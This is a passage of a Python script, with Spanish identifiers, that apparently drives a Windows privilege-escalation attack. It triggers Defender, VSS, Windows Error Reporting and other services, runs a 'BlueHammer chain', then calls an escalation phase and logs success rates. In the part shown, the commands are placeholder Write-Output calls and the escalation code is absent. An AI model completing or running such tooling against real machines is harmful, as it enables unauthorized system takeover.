@manejo_errores(timeout=90, reintentos=3)
def trigger_bluehammer_chain(archivo_destino: str, timeout: int = TIMEOUT_DEFECTO) -> dict:
    """
    Cadena de operaciones BlueHammer
    """
    logger.info(f"[*] Ejecutando BlueHammer chain con destino: {archivo_destino}")
    
    if not validar_ruta_accesible(archivo_destino):
        logger.warning(f"[!] Ruta {archivo_destino} no es accesible, usando ruta alternativa")
        archivo_destino = str(Path.home() / "target.bin")
    
    target_path = Path(archivo_destino)
    try:
        target_path.parent.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        logger.error(f"No se pudo crear directorio: {e}")
        raise
    
    operaciones = [
        ("Preparando sistema", "Write-Output 'Preparando...'"),
        ("Configurando handlers", "Write-Output 'Configurando...'"),
        ("Ejecutando chain", f"Write-Output 'Target: {archivo_destino}'"),
    ]
    
    for nombre_op, cmd in operaciones:
        logger.info(f"  L- {nombre_op}...")
        resultado = ejecutar_powershell(cmd, timeout // len(operaciones))
        logger.debug(f"     Resultado: {resultado['stdout']}")
    
    return {
        "stdout": f"BlueHammer chain completado para {archivo_destino}",
        "stderr": "",
        "returncode": 0
    }


# ========== DISPATCHER PRINCIPAL ==========

class DispatcherServicios:
    """Gestor centralizado de triggers de servicios"""
    
    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run
        self._triggers: Dict[ServicioObjetivo, Callable] = {
            ServicioObjetivo.DEFENDER_SCAN:     trigger_defender_scan,
            ServicioObjetivo.DEFENDER_UPDATE:   trigger_defender_update,
            ServicioObjetivo.WER:               trigger_windows_error_reporting,
            ServicioObjetivo.VSS:               trigger_vss_snapshot,
            ServicioObjetivo.MSIEXEC:           trigger_windows_installer,
            ServicioObjetivo.SEARCH_INDEXER:    trigger_search_indexer,
            ServicioObjetivo.CLOUD_FILES:       trigger_cloud_files_filter,
            ServicioObjetivo.BLUEHAMMER:        lambda timeout=TIMEOUT_DEFECTO: trigger_bluehammer_chain(ARCHIVO_DESTINO, timeout=timeout),
        }
        self._resultados: List[ResultadoTrigger] = []
        self._inicio_sesion = datetime.now()
    
    def validar_estado(self) -> bool:
        """Valida que el entorno sea correcto antes de ejecutar"""
        logger.info("=" * 80)
        logger.info("VALIDACION DE ENTORNO")
        logger.info("=" * 80)
        logger.info(f"[*] Entorno detectado: {ENTORNO}")
        logger.info(f"[*] Ruta de logs: {LOG_DIR}")
        logger.info(f"[*] Archivo destino: {ARCHIVO_DESTINO}")
        
        if not validar_entorno():
            logger.error("[x] Validacion de entorno fallida")
            return False
        
        if not validar_permisos():
            logger.error("[x] No se pudo obtener permisos de administrador")
            return False
        
        logger.info("[+] Entorno validado correctamente")
        logger.info("=" * 80)
        return True
    
    def trigger(self, servicio: ServicioObjetivo) -> ResultadoTrigger:
        """Dispara un servicio individual"""
        logger.info(f"\n[>] Disparando: {servicio.value}")
        
        trigger_fn = self._triggers.get(servicio)
        
        if not trigger_fn:
            logger.error(f"[x] Servicio {servicio} no implementado")
            resultado = ResultadoTrigger(
                exito=False,
                servicio=servicio.value,
                mensaje="Servicio no implementado"
            )
            self._resultados.append(resultado)
            return resultado
        
        resultado = trigger_fn()
        self._resultados.append(resultado)
        return resultado
    
    def trigger_multiples(self, servicios: List[ServicioObjetivo]) -> List[ResultadoTrigger]:
        """Dispara múltiples servicios secuencialmente"""
        logger.info(f"\n[>] Disparando {len(servicios)} servicios...")
        resultados = []
        
        for i, servicio in enumerate(servicios, 1):
            logger.info(f"\n[{i}/{len(servicios)}] {servicio.value}")
            resultado = self.trigger(servicio)
            resultados.append(resultado)
            time.sleep(1)
        
        return resultados
    
    def obtener_resumen(self) -> dict:
        """Genera resumen de ejecuciones"""
        if not self._resultados:
            return {
                "total": 0,
                "exitosas": 0,
                "fallidas": 0,
                "tasa_exito": 0,
                "duracion_total_ms": 0
            }
        
        total = len(self._resultados)
        exitosas = sum(1 for r in self._resultados if r.exito)
        duracion_total = sum(r.duracion_ms for r in self._resultados)
        
        return {
            "total": total,
            "exitosas": exitosas,
            "fallidas": total - exitosas,
            "tasa_exito": (exitosas / total * 100) if total > 0 else 0,
            "duracion_total_ms": duracion_total,
            "duracion_promedio_ms": duracion_total / total if total > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
    
    def exportar_resultados(self, formato: str = "json") -> str:
        """Exporta resultados en formato especificado con detalles de intentos"""
        if formato == "json":
            datos = {
                "sesion": {
                    "inicio": self._inicio_sesion.isoformat(),
                    "fin": datetime.now().isoformat(),
                    "resumen": self.obtener_resumen(),
                    "entorno": ENTORNO
                },
                "resultados": [r.to_dict() for r in self._resultados]
            }
            return json.dumps(datos, indent=2, ensure_ascii=False)
        
        elif formato == "csv":
            lineas = ["servicio,exito,mensaje,duracion_ms,intentos,codigo_retorno"]
            for r in self._resultados:
                lineas.append(
                    f'"{r.servicio}",{r.exito},"{r.mensaje}",{r.duracion_ms},{r.intentos},{r.codigo_retorno}'
                )
            return "\n".join(lineas)
        
        elif formato == "txt":
            lineas = ["=" * 80, "REPORTE DETALLADO DE EJECUCION", "=" * 80]
            lineas.append(f"Entorno: {ENTORNO}\n")
            resumen = self.obtener_resumen()
            lineas.append(f"Exitosas: {resumen['exitosas']}/{resumen['total']}")
            lineas.append(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
            lineas.append(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms\n")
            
            for r in self._resultados:
                estado = "✓" if r.exito else "✗"
                lineas.append(f"\n[{estado}] SERVICIO: {r.servicio}")
                lineas.append(f"    Estado: {'EXITOSO' if r.exito else 'FALLIDO'}")
                lineas.append(f"    Mensaje: {r.mensaje}")
                lineas.append(f"    Código retorno: {r.codigo_retorno}")
                lineas.append(f"    Duracion total: {r.duracion_ms:.2f}ms")
                lineas.append(f"    Intentos: {r.intentos}")
                
                if r.stdout:
                    lineas.append(f"    Respuesta STDOUT: {r.stdout[:150]}...")
                if r.stderr:
                    lineas.append(f"    Error STDERR: {r.stderr[:150]}...")
                
                if r.intentos_detalles:
                    lineas.append(f"    DETALLES DE INTENTOS:")
                    for det in r.intentos_detalles:
                        lineas.append(f"      └─ Intento {det['numero']}: {det['estado']} ({det['duracion_ms']:.2f}ms)")
                        if det['respuesta']:
                            lineas.append(f"         Respuesta: {det['respuesta'][:100]}")
                        if det['codigo_retorno'] is not None:
                            lineas.append(f"         Código: {det['codigo_retorno']}")
            
            return "\n".join(lineas)
        
        return ""
    
    def guardar_reporte(self, nombre_archivo: str = None):
        """Guarda reporte en archivo"""
        if not nombre_archivo:
            nombre_archivo = LOG_DIR / f"reporte_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        ruta = Path(nombre_archivo)
        contenido = self.exportar_resultados("json")
        ruta.write_text(contenido, encoding="utf-8")
        logger.info(f"[+] Reporte guardado en: {ruta}")


# ========== PROGRAMA PRINCIPAL ==========

def main():
    """Función principal"""
    try:
        dispatcher = DispatcherServicios(dry_run=DRY_RUN)
        
        if not dispatcher.validar_estado():
            return 1
        
        if DRY_RUN:
            logger.warning("[!] Ejecutandose en modo DRY-RUN - No se realizaran cambios reales")
        
        # ========== FASE 1: DISPAROS DE SERVICIOS ==========
        logger.info("\n\n" + "╔" + "═" * 78 + "╗")
        logger.info("║" + " FASE 1: DISPAROS DE SERVICIOS WINDOWS ".center(78) + "║")
        logger.info("╚" + "═" * 78 + "╝\n")
        
        servicios = [
            ServicioObjetivo.DEFENDER_SCAN,
            ServicioObjetivo.DEFENDER_UPDATE,
            ServicioObjetivo.VSS,
            ServicioObjetivo.WER,
            ServicioObjetivo.BLUEHAMMER
        ]
        
        resultados = dispatcher.trigger_multiples(servicios)
        
        logger.info("\n" + "=" * 80)
        logger.info("RESUMEN FASE 1 - DISPAROS DE SERVICIOS")
        logger.info("=" * 80)
        resumen = dispatcher.obtener_resumen()
        logger.info(f"Total de servicios: {resumen['total']}")
        logger.info(f"Exitosos: {resumen['exitosas']}")
        logger.info(f"Fallidos: {resumen['fallidas']}")
        logger.info(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
        logger.info(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms")
        logger.info("=" * 80)
        
        # ========== FASE 2: ESCALADA DE PRIVILEGIOS ==========
        escalador = EscaladaDePrivilegios()
        resultados_escalada = escalador.ejecutar_todas_estrategias()
        
        logger.info("\n" + "=" * 80)
        logger.info("RESUMEN FASE 2 - ESCALADA DE PRIVILEGIOS")
        logger.info("=" * 80)
        resumen_escalada = escalador.obtener_resumen_escalada()
        logger.info(f"Total estrategias: {resumen_escalada['total']}")
        logger.info(f"Exitosas: {resumen_escalada['exitosas']}")
        logger.info(f"Fallidas: {resumen_escalada['fallidas']}")
        logger.info(f"Tasa de exito: {resumen_escalada['tasa_exito']:.2f}%")
        logger.info(f"Nivel máximo alcanzado: {resumen_escalada['nivel_maximo'].upper()}")
        logger.info("=" * 80)
        
        # ========== EXPORTAR RESULTADOS ==========
        logger.info("\n[*] Exportando resultados...")
        dispatcher.guardar_reporte()
        
        # Guardar reporte de escalada
        nombre_escalada = LOG_DIR / f"reporte_escalada_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        ruta_escalada = Path(nombre_escalada)
        contenido_escalada = escalador.exportar_resultados_escalada("json")
        ruta_escalada.write_text(contenido_escalada, encoding="utf-8")
        logger.info(f"[+] Reporte de escalada guardado en: {ruta_escalada}")
        
        # Mostrar reportes finales
        print("\n" + dispatcher.exportar_resultados("txt"))
        print("\n" + escalador.exportar_resultados_escalada("txt"))
        
        return 0 if (resumen['exitosas'] > 0 or resumen_escalada['exitosas'] > 0) else 1
    
    except KeyboardInterrupt:
        logger.warning("\n[!] Ejecucion interrumpida por el usuario")
        return 130
    
    except Exception as e:
        logger.exception(f"[x] Error no controlado: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
